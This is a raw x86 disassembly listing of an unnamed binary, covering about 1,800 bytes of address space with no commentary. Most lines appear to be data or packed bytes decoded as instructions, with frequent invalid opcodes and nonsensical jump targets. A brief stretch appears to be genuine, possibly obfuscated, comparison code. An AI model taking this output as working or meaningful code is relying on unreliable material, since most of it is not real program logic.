  416952:	out    dx,eax
  416953:	and    esp,ecx
  416955:	in     eax,0x16
  416957:	sub    eax,ebx
  416959:	mov    dh,0xfa
  41695b:	push   ebp
  41695c:	jecxz  0x41695d
  41695e:	xor    edi,esp
  416960:	mov    ch,BYTE PTR [edx]
  416962:	ret    
  416963:	ins    BYTE PTR es:[edi],dx
  416964:	jl     0x41694b
  416966:	inc    ebx
  416967:	in     al,dx
  416968:	(bad)  
  416969:	iret   
  41696a:	xchg   esi,eax
  41696b:	arpl   WORD PTR cs:[eax],di
  41696e:	pop    ebx
  41696f:	cmc    
  416970:	(bad)  
  416971:	mov    ebp,0xcad42d93
  416976:	repnz into 
  416978:	mov    ch,0x7
  41697a:	mov    bl,BYTE PTR [esi+ecx*2+0x7c03101]
  416981:	xchg   edx,eax
  416982:	add    DWORD PTR [edi+0x74],edi
  416985:	xlat   BYTE PTR ds:[ebx]
  416986:	and    BYTE PTR [edi+0x5d],ah
  416989:	out    0x6,al
  41698b:	mov    ss,WORD PTR [ebx]
  41698d:	push   cs
  41698e:	fs ja  0x41697e
  416991:	mov    bl,0x71
  416993:	data16 adc BYTE PTR [edx],bl
  416996:	imul   ebp,DWORD PTR [ebp+0x67],0x6d7507bb
  41699d:	pop    edi
  41699e:	lahf   
  41699f:	cmp    BYTE PTR ds:0xb3b6c4a9,ah
  4169a5:	rcr    BYTE PTR [ebx-0x30a49a3],0x1e
  4169ac:	sbb    DWORD PTR [edi-0x6f283703],eax
  4169b2:	pop    ebx
  4169b3:	(bad)  
  4169b4:	cmp    eax,0xb4117ab9
  4169b9:	jle    0x416974
  4169bb:	loop   0x416a21
  4169bd:	xor    al,0x5e
  4169bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169c2:	lods   eax,DWORD PTR ds:[esi]
  4169c3:	in     al,dx
  4169c4:	add    eax,0x9bebc72a
  4169c9:	xchg   edx,eax
  4169ca:	shl    ebp,cl
  4169cc:	xor    ebp,eax
  4169ce:	hlt    
  4169cf:	imul   edi,DWORD PTR [ebx+0x2b3f6d16],0x6c
  4169d6:	aam    0x41
  4169d8:	outs   dx,BYTE PTR ds:[esi]
  4169d9:	(bad)  
  4169db:	shl    DWORD PTR [eax+0x70edd5e3],1
  4169e1:	xor    DWORD PTR [edx],eax
  4169e3:	push   0xfc9c5e4d
  4169e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169e9:	xor    DWORD PTR [ecx],ebx
  4169eb:	pop    ebp
  4169ec:	add    DWORD PTR [edx],0xffffffff
  4169ef:	push   eax
  4169f0:	cmp    esp,esp
  4169f2:	jb     0x416a17
  4169f4:	jno    0x4169cc
  4169f6:	call   0xf64e:0x54dea011
  4169fd:	xchg   BYTE PTR [edi+0x588a7db5],cl
  416a03:	push   ecx
  416a04:	out    0x28,eax
  416a06:	pop    eax
  416a07:	sbb    BYTE PTR [ecx],0x27
  416a0a:	push   ecx
  416a0b:	lea    ebp,[edx+edi*8]
  416a0e:	ins    BYTE PTR es:[edi],dx
  416a0f:	retf   
  416a10:	(bad)  
  416a11:	mov    ebp,0x5ad8621b
  416a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a17:	inc    edi
  416a18:	frstor [ebx+ecx*2+0x26]
  416a1c:	sahf   
  416a1d:	push   edi
  416a1e:	rcl    dh,0xd9
  416a21:	xchg   esp,eax
  416a22:	pushw  0x72
  416a25:	gs nop
  416a27:	in     al,0x41
  416a29:	cs in  al,dx
  416a2b:	cdq    
  416a2c:	out    0xfe,al
  416a2e:	inc    esp
  416a2f:	xchg   edi,eax
  416a30:	mov    bl,0x70
  416a32:	ret    0xe7fe
  416a35:	and    eax,0xd4398385
  416a3a:	sub    esi,ebp
  416a3c:	lods   al,BYTE PTR ds:[esi]
  416a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a3e:	sahf   
  416a3f:	test   eax,0xebd1ae13
  416a44:	mov    esp,0x3d9d7b
  416a49:	loopne 0x4169e8
  416a4b:	retf   
  416a4c:	sbb    ebx,esp
  416a4e:	sub    bh,dl
  416a50:	popa   
  416a51:	push   esp
  416a52:	shl    DWORD PTR [edx+ebx*1+0x7d73328e],1
  416a59:	popf   
  416a5a:	mov    DWORD PTR [esi],ebx
  416a5c:	jp     0x416a4e
  416a5e:	inc    eax
  416a5f:	mov    ds:0x444597e3,al
  416a64:	xchg   ebx,eax
  416a65:	pop    ss
  416a66:	icebp  
  416a67:	sbb    ebp,ebp
  416a69:	mov    al,0x69
  416a6b:	mov    dl,0x31
  416a6d:	hlt    
  416a6e:	int3   
  416a6f:	sbb    al,0x7e
  416a71:	inc    eax
  416a72:	shl    DWORD PTR [ebx+0x26],1
  416a75:	fisttp DWORD PTR [esi+0x3592c8f0]
  416a7b:	adc    ebp,esp
  416a7d:	inc    ebp
  416a7e:	inc    esp
  416a7f:	inc    eax
  416a80:	mov    al,0xc
  416a82:	in     al,0xab
  416a84:	xchg   esp,eax
  416a85:	inc    ebx
  416a86:	fidiv  DWORD PTR [esi]
  416a88:	call   0xb60a:0x1fdf93ff
  416a8f:	mov    BYTE PTR [ebx-0x32],dl
  416a92:	pop    ds
  416a93:	xor    al,0x82
  416a95:	mov    al,ds:0x133cce49
  416a9a:	bound  eax,QWORD PTR [ecx+0x1cd4b6be]
  416aa0:	add    al,0x54
  416aa2:	mov    bh,0x1e
  416aa4:	xchg   ecx,eax
  416aa5:	mov    ebx,esp
  416aa7:	and    al,0xa8
  416aa9:	pop    esi
  416aaa:	dec    DWORD PTR [esi]
  416aac:	inc    esp
  416aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aae:	push   esi
  416aaf:	scas   al,BYTE PTR es:[edi]
  416ab0:	xor    cl,cl
  416ab2:	mov    esi,0x80ab8251
  416ab7:	sbb    edx,eax
  416ab9:	sti    
  416aba:	ss aaa 
  416abc:	fst    DWORD PTR [ecx-0x4a]
  416abf:	sub    BYTE PTR [edx+0x234d6108],dh
  416ac5:	neg    BYTE PTR [edi+0x2d]
  416ac8:	jns    0x852fc938
  416ace:	push   0x6ed6a3e0
  416ad3:	sub    ecx,ebp
  416ad5:	and    dh,ah
  416ad7:	out    0xd0,al
  416ad9:	ins    DWORD PTR es:[edi],dx
  416ada:	cmp    dl,BYTE PTR [esi]
  416adc:	sbb    dl,bh
  416ade:	mov    ah,0x8c
  416ae0:	popa   
  416ae1:	cmc    
  416ae2:	popa   
  416ae3:	mov    ah,0xd8
  416ae5:	and    BYTE PTR [ebx-0x4a38d2d5],0x37
  416aec:	inc    ebp
  416aed:	fadd   DWORD PTR [edx-0x17]
  416af0:	inc    ebp
  416af1:	jmp    0x46b55f5b
  416af6:	xchg   ecx,eax
  416af7:	lock mov eax,edi
  416afa:	sbb    eax,0xa75926ea
  416aff:	pop    DWORD PTR [eax+0x67]
  416b02:	pop    ecx
  416b03:	inc    ebp
  416b04:	aad    0x83
  416b06:	aam    0xdc
  416b08:	cmp    DWORD PTR [ecx+0x4adec0ea],ecx
  416b0e:	jg     0x416b7d
  416b10:	imul   edx,edi,0xffffffb4
  416b13:	jb     0x416ad0
  416b15:	mov    ecx,esp
  416b17:	rol    dl,0xc2
  416b1a:	std    
  416b1b:	pop    ss
  416b1c:	retf   
  416b1d:	and    ebp,0xf16e28b2
  416b23:	test   al,0xd
  416b25:	or     BYTE PTR [ecx+0x3f],al
  416b28:	ins    DWORD PTR es:[edi],dx
  416b29:	shl    DWORD PTR [edi+0x12],1
  416b2c:	rcl    DWORD PTR [ebx],0xe9
  416b2f:	or     dh,BYTE PTR [di+0x76]
  416b33:	ret    
  416b34:	aas    
  416b35:	xchg   DWORD PTR [edx+0x68adcd6d],eax
  416b3b:	lea    eax,[edx+0xa]
  416b3e:	dec    ebp
  416b3f:	lahf   
  416b40:	push   eax
  416b41:	sbb    al,0xb5
  416b43:	xchg   ebp,eax
  416b44:	mov    al,0xca
  416b46:	pushf  
  416b47:	jbe    0x416b52
  416b49:	inc    ecx
  416b4a:	fucomip st,st(5)
  416b4c:	push   ebp
  416b4d:	sbb    al,dh
  416b4f:	jmp    0x8aee:0x13d8d4e2
  416b56:	sahf   
  416b57:	fcomp  QWORD PTR [ebp-0x318f22f8]
  416b5d:	jno    0x11666360
  416b63:	scas   eax,DWORD PTR es:[edi]
  416b64:	sti    
  416b65:	dec    edi
  416b66:	std    
  416b67:	stos   DWORD PTR es:[edi],eax
  416b68:	aas    
  416b69:	mov    ds:0xe2894e10,eax
  416b6e:	sub    al,0x45
  416b70:	inc    esp
  416b71:	rcl    DWORD PTR [ebp+0x4052839f],1
  416b77:	jns    0x416bc0
  416b79:	add    BYTE PTR [edi],ah
  416b7b:	cs inc ebx
  416b7d:	push   ds
  416b7e:	pop    edx
  416b7f:	push   ss
  416b80:	fbld   TBYTE PTR [ecx-0xc]
  416b83:	int    0xce
  416b85:	test   DWORD PTR [ebx],edi
  416b87:	cwde   
  416b88:	jns    0x416b8d
  416b8a:	pop    esi
  416b8b:	mov    ah,BYTE PTR [esp+esi*1-0x35]
  416b8f:	scas   al,BYTE PTR es:[edi]
  416b90:	loopne 0x416b2e
  416b92:	mov    esi,0xafd625d1
  416b97:	neg    DWORD PTR [edx+0x73]
  416b9a:	jge    0x416ba2
  416b9c:	icebp  
  416b9d:	fild   WORD PTR [edx+0x6089269d]
  416ba3:	ror    ah,1
  416ba5:	cmp    al,al
  416ba7:	mov    al,0x3c
  416ba9:	shl    DWORD PTR [edi],cl
  416bab:	sbb    DWORD PTR [esi+ebx*4-0x2c],esp
  416baf:	(bad)  
  416bb0:	aam    0xcb
  416bb2:	cmp    ebp,DWORD PTR [ecx-0x57]
  416bb5:	push   ecx
  416bb6:	push   es
  416bb7:	mov    cl,0x2d
  416bb9:	dec    ebx
  416bba:	push   esp
  416bbb:	push   ebp
  416bbc:	add    eax,0xaad108da
  416bc1:	add    al,0x1f
  416bc3:	(bad)  
  416bc4:	stc    
  416bc5:	push   esi
  416bc6:	cmp    cl,BYTE PTR [ebp+0x19]
  416bc9:	leave  
  416bca:	xor    al,0x96
  416bcc:	mov    ebp,0x2b0ce9f8
  416bd1:	bound  ecx,QWORD PTR [ebp-0x13f015dd]
  416bd7:	mov    eax,0x558bc441
  416bdc:	or     BYTE PTR [ebx],dh
  416bde:	rol    BYTE PTR [ebx],1
  416be0:	(bad)  
  416be1:	jne    0x414733
  416be7:	mov    edx,DWORD PTR [ebp-0xc]
  416bea:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  416bf1:	mov    bl,BYTE PTR [ebp-0x1]
  416bf4:	cmp    dl,bl
  416bf6:	je     0x419033
  416bfc:	mov    ecx,DWORD PTR [ebp-0x5c]
  416bff:	mov    edx,DWORD PTR [ebp-0xc]
  416c02:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  416c09:	mov    ebx,DWORD PTR [ebp+0xc]
  416c0c:	xor    ecx,eax
  416c0e:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f1]
  416c15:	jne    0x41b4c6
  416c1b:	mov    ecx,DWORD PTR [ebp-0x5c]
  416c1e:	mov    edx,DWORD PTR [ebp+0xc]
  416c21:	xor    ecx,eax
  416c23:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f1]
  416c2b:	mov    edx,DWORD PTR [ebp-0x18]
  416c2e:	xor    edx,eax
  416c30:	add    edx,esi
  416c32:	cmp    ecx,edx
  416c34:	mov    ecx,DWORD PTR [ebp-0x14]
  416c37:	mov    DWORD PTR [ebp+0x8],ecx
  416c3a:	mov    ecx,DWORD PTR [ebp+0x8]
  416c3d:	je     0x421feb
  416c43:	xor    ecx,eax
  416c45:	add    ecx,esi
  416c47:	mov    ecx,0x242ebc9
  416c4c:	je     0x4190bb
  416c52:	mov    edx,DWORD PTR [ebp+0x8]
  416c55:	mov    ebx,DWORD PTR [ebp-0x8]
  416c58:	xor    edx,eax
  416c5a:	jmp    0x418fb9
  416c5f:	test   BYTE PTR fs:[esi],bl
  416c62:	pop    es
  416c63:	sahf   
  416c64:	and    DWORD PTR [edx-0x80],0x235b4cfa
  416c6b:	sub    al,0x47
  416c6d:	dec    edx
  416c6e:	dec    ebx
  416c6f:	jno    0x416cb3
  416c71:	jl     0x416bf6
  416c73:	cmp    eax,0xdf83835e
  416c78:	addr16 push 0x34
  416c7b:	or     BYTE PTR [edx],bl
  416c7d:	pop    edx
  416c7e:	xchg   edi,eax
  416c7f:	xchg   DWORD PTR [edi-0x77e5fb60],esp
  416c85:	adc    eax,0x5727b723
  416c8a:	loop   0x416c51
  416c8c:	js     0x416cd1
  416c8e:	enter  0x7bdd,0x9e
  416c92:	mov    edi,0xc72595ea
  416c97:	neg    BYTE PTR [edi-0x67]
  416c9a:	mov    edx,0xfc00541f
  416c9f:	jle    0x416cfa
  416ca1:	aam    0x2e
  416ca3:	xlat   BYTE PTR ds:[ebx]
  416ca4:	shl    al,cl
  416ca6:	dec    esi
  416ca7:	sbb    bh,BYTE PTR [ebx+0xe]
  416caa:	lea    esp,[ebx+esi*2-0x63]
  416cae:	xor    al,0x41
  416cb0:	add    al,0x20
  416cb2:	pusha  
  416cb3:	stos   BYTE PTR es:[edi],al
  416cb4:	or     al,BYTE PTR [ebx]
  416cb6:	pop    ebx
  416cb7:	jecxz  0x416ccf
  416cb9:	mov    DWORD PTR [eax+0x57],0xe7c42d1a
  416cc0:	xor    al,0xc4
  416cc2:	rcr    cl,1
  416cc4:	pop    ebp
  416cc5:	into   
  416cc6:	sub    al,0x89
  416cc8:	push   ss
  416cc9:	shr    DWORD PTR [ebp+edx*4-0x26],1
  416ccd:	fdivr  st(6),st
  416ccf:	sbb    ecx,DWORD PTR [ecx]
  416cd1:	xchg   edx,eax
  416cd2:	aaa    
  416cd3:	fist   WORD PTR [eax]
  416cd5:	int3   
  416cd6:	mov    ah,0x2a
  416cd8:	test   DWORD PTR [edx+edx*1+0x25],edi
  416cdc:	retf   0xfb9e
  416cdf:	ins    BYTE PTR es:[edi],dx
  416ce0:	push   ss
  416ce1:	loop   0x416c9b
  416ce3:	mov    esi,gs
  416ce5:	add    al,0x7a
  416ce7:	add    al,0x13
  416ce9:	and    BYTE PTR [edx],dl
  416ceb:	sbb    eax,0x10f03b22
  416cf0:	pop    es
  416cf1:	dec    edx
  416cf2:	cdq    
  416cf3:	arpl   WORD PTR [esi],cx
  416cf5:	jmp    0x416cec
  416cf7:	cli    
  416cf8:	mov    bl,0x8a
  416cfa:	mov    ecx,0x2b452eb9
  416cff:	int3   
  416d00:	push   ecx
  416d01:	or     DWORD PTR [esi],esi
  416d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d04:	sub    BYTE PTR [ebx],bh
  416d06:	mov    ebp,0x2455e2b0
  416d0b:	sahf   
  416d0c:	sbb    edx,ebp
  416d0e:	shl    eax,cl
  416d10:	addr16 mov dl,0x49
  416d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d14:	scas   al,BYTE PTR es:[edi]
  416d15:	jge    0x416d93
  416d17:	aaa    
  416d18:	push   esp
  416d19:	pop    edi
  416d1a:	test   eax,0x7d611da
  416d1f:	repz jne 0x416d9f
  416d22:	xchg   edx,eax
  416d23:	and    DWORD PTR [esp+edi*8],ecx
  416d26:	inc    ebp
  416d27:	aas    
  416d28:	jno    0x416d36
  416d2a:	pop    ebx
  416d2b:	sbb    BYTE PTR [esi],ah
  416d2d:	mov    WORD PTR [esi-0x7],?
  416d30:	cdq    
  416d31:	jmp    0x416cf1
  416d33:	fwait
  416d34:	imul   ecx,DWORD PTR [ebx-0x8d626f5],0x76
  416d3b:	mov    ebx,0xdec9b1ca
  416d40:	lods   eax,DWORD PTR ds:[esi]
  416d41:	jle    0x416d95
  416d43:	mov    eax,0x2bee5a2e
  416d48:	hlt    
  416d49:	in     eax,dx
  416d4a:	or     dl,BYTE PTR [ecx+0x7a13b3e9]
  416d50:	sub    edi,DWORD PTR [ebx+edi*8]
  416d53:	imul   esp,ebp,0xa9703b04
  416d59:	jge    0x416dbd
  416d5b:	fcmovnb st,st(6)
  416d5d:	ret    
  416d5e:	mov    dl,BYTE PTR ds:0xdcf87feb
  416d64:	ja     0x416d98
  416d66:	loop   0x416d87
  416d68:	addr16 out dx,eax
  416d6a:	jl     0x416d0f
  416d6c:	ficomp WORD PTR [ecx+0x6a]
  416d6f:	rcl    esp,0xec
  416d72:	popa   
  416d73:	inc    esp
  416d74:	adc    eax,0x4df32b0e
  416d79:	push   cs
  416d7a:	and    DWORD PTR [edi],0x1d
  416d7d:	(bad)  
  416d7e:	pusha  
  416d7f:	dec    eax
  416d80:	scas   eax,DWORD PTR es:[edi]
  416d81:	cmp    al,0xeb
  416d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d84:	cmc    
  416d85:	call   0xca501f6f
  416d8a:	lods   al,BYTE PTR ds:[esi]
  416d8b:	pop    edi
  416d8c:	add    DWORD PTR [ebx-0x7286676f],eax
  416d92:	lods   eax,DWORD PTR ds:[esi]
  416d93:	lea    ebp,[ebx]
  416d95:	sub    BYTE PTR [eax],ah
  416d97:	in     eax,0x5c
  416d99:	mov    eax,0x8208692b
  416d9e:	addr16 mov cl,0x57
  416da1:	adc    al,0xb9
  416da3:	jg     0x416e0a
  416da5:	sub    eax,edx
  416da7:	leave  
  416da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416da9:	mov    ebp,0x5b5b1896
  416dae:	in     eax,0x3b
  416db0:	jl     0x416d41
  416db2:	cmc    
  416db3:	jo     0x416e2e
  416db5:	dec    edi
  416db6:	loopne 0x416d7b
  416db8:	scas   eax,DWORD PTR es:[edi]
  416db9:	add    al,0x18
  416dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dbc:	mov    al,ds:0x8e6c713f
  416dc1:	mov    DWORD PTR [edx+edi*4],ecx
  416dc4:	sahf   
  416dc5:	push   ss
  416dc6:	lds    edx,FWORD PTR [edx]
  416dc8:	xor    eax,0xfeaf5be5
  416dcd:	mov    ah,0x7a
  416dcf:	xor    eax,0xc81b0282
  416dd4:	dec    edx
  416dd5:	ja     0x416da1
  416dd7:	sbb    DWORD PTR [esi],esp
  416dd9:	sub    eax,0xce8f387c
  416dde:	xor    ch,BYTE PTR [edi]
  416de0:	(bad)  
  416de2:	xchg   esp,eax
  416de3:	call   FWORD PTR [ebp-0x5f0c3dc2]
  416de9:	add    al,0xf6
  416deb:	mov    ss,WORD PTR [eax+0x21]
  416dee:	(bad)  
  416def:	jmp    0xe72d:0x32b89601
  416df6:	xor    DWORD PTR fs:0x1406ca4c,esp
  416dfd:	mov    ah,0x3a
  416dff:	ret    0xd1fc
  416e02:	push   ecx
  416e03:	jmp    0x9268:0xc6454bc
  416e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e0b:	sbb    eax,0x9e8e2654
  416e10:	push   eax
  416e11:	and    bh,ch
  416e13:	stos   DWORD PTR es:[edi],eax
  416e14:	jnp    0x416dcd
  416e16:	push   ecx
  416e17:	mov    dh,0xff
  416e19:	dec    eax
  416e1a:	pop    eax
  416e1b:	call   0x67cc5e3
  416e20:	gs adc ebp,edx
  416e23:	fst    st(0)
  416e25:	push   cs
  416e26:	xchg   ebx,eax
  416e27:	xchg   DWORD PTR [edi+0x6a4d29f1],ebp
  416e2d:	les    ebx,FWORD PTR [esi-0x7]
  416e30:	mov    edi,0xb92acbb1
  416e35:	sbb    BYTE PTR [ebx],0xef
  416e38:	out    0x75,eax
  416e3a:	pop    eax
  416e3b:	dec    esi
  416e3c:	sub    al,0x6c
  416e3e:	lea    ecx,[esi-0x21]
  416e41:	js     0x416e8c
  416e43:	test   esi,esp
  416e45:	dec    ebp
  416e46:	adc    eax,0xa43b3503
  416e4b:	mov    ebp,0x33b10a18
  416e50:	(bad)  
  416e51:	pop    ebp
  416e52:	sbb    cl,BYTE PTR [ebp-0x192eb66a]
  416e58:	fwait
  416e59:	mov    BYTE PTR [edi+ebx*4+0x63],0xa1
  416e5e:	adc    al,BYTE PTR [ebp-0x3c]
  416e61:	fsubr  DWORD PTR [esi+0x606ee898]
  416e67:	cwde   
  416e68:	xchg   esi,esi
  416e6a:	adc    eax,ecx
  416e6c:	aas    
  416e6d:	sbb    al,0xd4
  416e6f:	and    eax,0x3d77069
  416e74:	and    edi,ecx
  416e76:	lock je 0x416ed7
  416e79:	(bad)  
  416e7a:	mov    DWORD PTR [ecx+0xb96cc25],eax
  416e80:	pop    edi
  416e81:	dec    ecx
  416e82:	jle    0x416ecc
  416e84:	ss scas eax,DWORD PTR es:[edi]
  416e86:	add    ch,dl
  416e88:	in     eax,dx
  416e89:	jecxz  0x416e30
  416e8b:	out    0x6e,al
  416e8d:	int3   
  416e8e:	(bad)  [ecx+eiz*2+0x73]
  416e92:	add    DWORD PTR [esi+edi*4+0x4c],edx
  416e96:	push   ebx
  416e97:	mov    bh,0x47
  416e99:	dec    ebx
  416e9a:	add    dl,al
  416e9c:	not    DWORD PTR [esi+ebp*4+0x55]
  416ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ea1:	stos   BYTE PTR es:[edi],al
  416ea2:	cli    
  416ea3:	jle    0x416eac
  416ea5:	and    BYTE PTR [edi+0xf0e060d],ah
  416eab:	xor    edi,ebx
  416ead:	pop    ebx
  416eae:	aam    0x7e
  416eb0:	popf   
  416eb1:	js     0x416ef5
  416eb3:	pop    ebx
  416eb5:	add    ch,bl
  416eb7:	add    DWORD PTR [ecx],0x72
  416eba:	rol    DWORD PTR [eax+ebp*1-0x56],cl
  416ebe:	pop    ds
  416ebf:	sbb    bl,ah
  416ec1:	fisubr DWORD PTR [edi-0x41ff7d2a]
  416ec7:	jmp    0x8b51146
  416ecc:	daa    
  416ecd:	repz and ah,BYTE PTR [ebx-0x2252dfb7]
  416ed4:	push   ecx
  416ed5:	mov    bl,BYTE PTR [ebx-0x27]
  416ed8:	cmp    DWORD PTR [ecx+0x57],edx
  416edb:	shl    BYTE PTR [edx],1
  416edd:	mov    cl,0x31
  416edf:	xor    esp,edi
  416ee1:	push   0xd4eb7b93
  416ee6:	sbb    BYTE PTR ds:0xa36edeb0,dh
  416eec:	mov    ds:0xc97ad853,al
  416ef1:	test   DWORD PTR [eax+0x492b2cbd],esp
  416ef7:	retf   0x3a81
  416efa:	test   al,0xe7
  416efc:	push   ecx
  416efd:	ins    BYTE PTR es:[edi],dx
  416efe:	cld    
  416eff:	jl     0x416e87
  416f01:	push   ss
  416f02:	int    0x5f
  416f04:	jmp    0x5714afbe
  416f09:	cmp    bl,BYTE PTR [edi-0xd]
  416f0c:	sbb    al,0xb6
  416f0f:	mov    cl,0x3
  416f11:	(bad)  ds:0xc77abf47
  416f17:	test   BYTE PTR [ebx-0x49],bh
  416f1a:	cmp    BYTE PTR [eax-0x246f4e98],dl
  416f20:	inc    eax
  416f21:	push   ebp
  416f22:	icebp  
  416f23:	cmc    
  416f24:	sub    al,0x15
  416f26:	cmp    DWORD PTR [ebx],0xffffffbd
  416f29:	addr16 addr16 mov ebx,0xba4a6204
  416f30:	in     al,dx
  416f31:	pop    esi
  416f32:	xor    esp,DWORD PTR [eax*8-0x454967d0]
  416f39:	hlt    
  416f3a:	pusha  
  416f3b:	cdq    
  416f3c:	mov    esi,esp
  416f3e:	pop    edx
  416f3f:	sbb    DWORD PTR [ebp-0x58],edi
  416f42:	mov    ecx,0xac2b583c
  416f47:	jl     0x416eef
  416f49:	dec    esi
  416f4a:	ret    0xc79c
  416f4d:	mov    bl,BYTE PTR [ebx-0x405ecd6f]
  416f53:	jns    0x416fb8
  416f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f56:	jmp    0xcaebb2bd
  416f5b:	test   BYTE PTR ds:0xea7857a4,dh
  416f61:	in     eax,dx
  416f62:	cmp    DWORD PTR [esi+0x1b],edi
  416f65:	xchg   edi,eax
  416f66:	pop    ds
  416f67:	or     ecx,eax
  416f69:	sahf   
  416f6a:	or     BYTE PTR [edi],dl
  416f6c:	(bad)  
  416f6d:	aas    
  416f6e:	mov    ebx,0x2af4b860
  416f73:	mov    ebx,0xc81ae3ea
  416f78:	or     ecx,DWORD PTR [esi]
  416f7a:	(bad)  
  416f7b:	jp     0x416fd0
  416f7d:	sbb    ecx,DWORD PTR [eax]
  416f7f:	(bad)  
  416f80:	sbb    al,0xe8
  416f82:	hlt    
  416f83:	popa   
  416f84:	push   eax
  416f85:	pop    ebp
  416f86:	xchg   ebx,eax
  416f87:	imul   esp,DWORD PTR [eax],0x854d4b82
  416f8d:	daa    
  416f8e:	sbb    al,0x64
  416f90:	add    dl,cl
  416f92:	and    BYTE PTR ds:0xfab2e8b2,ah
  416f98:	sub    BYTE PTR [esi-0x21d16609],bl
  416f9e:	into   
  416f9f:	add    eax,0x1f5edd1f
  416fa4:	jno    0x416f29
  416fa6:	ja     0x416f94
  416fa8:	ss xchg edi,eax
  416faa:	daa    
  416fab:	sbb    edi,DWORD PTR [esi]
  416fad:	mov    fs,WORD PTR [esp+edi*4+0x5f8f0e81]
  416fb4:	test   eax,0xe3329e4c
  416fb9:	inc    ecx
  416fba:	aaa    
  416fbb:	push   0x23eed0f8
  416fc0:	push   0xffffffea
  416fc2:	or     al,0x51
  416fc4:	inc    ecx
  416fc5:	dec    edx
  416fc6:	sbb    DWORD PTR [esi-0x34],ebp
  416fc9:	cmp    DWORD PTR [ebx-0x69],ebp
  416fcc:	ss push cs
  416fce:	jns    0x416f62
  416fd0:	jl     0x416fef
  416fd2:	adc    cl,BYTE PTR [ebx+0x7e0bcb2d]
  416fd8:	arpl   WORD PTR [ebx-0x62],ax
  416fdb:	sahf   
  416fdc:	sti    
  416fdd:	imul   ebp,DWORD PTR ds:[edi-0x15dd136d],0x60af388f
  416fe8:	mov    eax,0xd61fda8d
  416fed:	mov    bh,0xa5
  416fef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ff0:	pop    ebx
  416ff1:	or     BYTE PTR [ebp+eiz*1+0x4f],bl
  416ff5:	sbb    ecx,DWORD PTR [ecx-0x4bf36a2c]
  416ffb:	mov    ds:0xe8dcbc2c,al
  417000:	or     al,0x0
  417002:	int3   
  417003:	popa   
  417004:	repnz add al,0xbd
  417007:	or     DWORD PTR [edi+0x58ceabe2],ecx
  41700d:	fld    QWORD PTR [ebx-0x1b]
  417010:	pop    edx
  417011:	xchg   BYTE PTR [ebx+0x74],cl
  417014:	xchg   esi,eax
  417015:	jle    0x41701f
  417017:	fstp   TBYTE PTR [ebx+0x52a4f17f]
  41701d:	mov    WORD PTR [ebx],fs
  41701f:	out    dx,eax
  417020:	mov    ebp,0x1de4b4f7
  417025:	nop
  417026:	ret    0x8da6
  417029:	test   DWORD PTR [edx+0x7c],esp
  41702c:	mov    ecx,0x1b1455d6
  417031:	xchg   ebp,eax
  417032:	or     esp,DWORD PTR [ebp-0x7e]
  417035:	xchg   DWORD PTR [ecx+0x9],eax
  417038:	mov    eax,0xc7d031ed
  41703d:	pop    es
  41703e:	pop    edi
  41703f:	add    ebp,DWORD PTR [edx+0x38]
  417042:	outs   dx,BYTE PTR ds:[esi]
  417043:	popf   
  417044:	cmp    al,0x8f
  417046:	(bad)  
  417047:	lea    ecx,[ebx-0x55]
  41704a:	xor    edx,DWORD PTR [edx]
  41704c:	popa   
  41704d:	mov    BYTE PTR [ecx-0x4f],bl
  417050:	adc    DWORD PTR [ecx-0x58051351],0x749a6a2d
  41705a:	sti    
  41705b:	ds mov esi,0xe3f6bed9
  417061:	dec    ebp
  417062:	pop    ebp
  417063:	jb     0x4170ab
  417065:	inc    esp
  417066:	push   0x77
  417068:	sti    
  417069:	push   ss
  41706a:	loopne 0x416ffe
  41706c:	sub    al,0xb7
  41706e:	jge    0x417054
  417070:	ins    BYTE PTR es:[edi],dx
  417071:	xor    eax,ebx
  417073:	and    bl,BYTE PTR [edx]
  417075:	sar    dh,cl
  417077:	aaa    
  417078:	sbb    BYTE PTR [esp+ebx*1+0x2c],0x45
  41707d:	mov    ss,esp
  41707f:	(bad)  
  417080:	das    
  417081:	jge    0x4170fa
  417083:	daa    
  417084:	clc    
  417085:	pop    ebp
  417086:	mov    WORD PTR [ebx],es
  417088:	jae    0x417078
  41708a:	(bad)  
  41708b:	add    DWORD PTR [edx],ebx
  41708d:	loop   0x417097
  41708f:	jl     0x4170f3
  417091:	ret    0x928d
  417094:	std    
  417095:	xor    ecx,DWORD PTR [eax]
  417097:	lahf   
  417098:	add    BYTE PTR [ebx],bl
  41709a:	mov    edx,0x2a3e32a8
  41709f:	mov    ebp,0x80bf9a15
  4170a4:	xchg   ch,bl
  4170a6:	jae    0x417042
  4170a8:	sub    DWORD PTR [ecx+0x7a],ebx
  4170ab:	test   edi,eax
  4170ad:	pop    ecx
  4170ae:	pop    eax
  4170af:	xchg   DWORD PTR [eax-0x30bb9dfa],edi
  4170b5:	ret    
  4170b6:	sbb    BYTE PTR [ebp-0x44b62b43],0x3a
  4170bd:	outs   dx,BYTE PTR ds:[esi]
  4170be:	xchg   ebx,eax
  4170bf:	sbb    DWORD PTR [edi+0x50],eax
  4170c2:	dec    esp
  4170c3:	hlt    
  4170c4:	xchg   edx,eax
  4170c5:	icebp  
  4170c6:	mov    bl,0xc6
  4170c8:	push   esp
  4170c9:	dec    ecx
  4170ca:	jbe    0x41705a
  4170cc:	cmc    
  4170cd:	jne    0x4170b1
  4170cf:	cld    
  4170d0:	jle    0x4170a4
  4170d2:	jne    0x417148
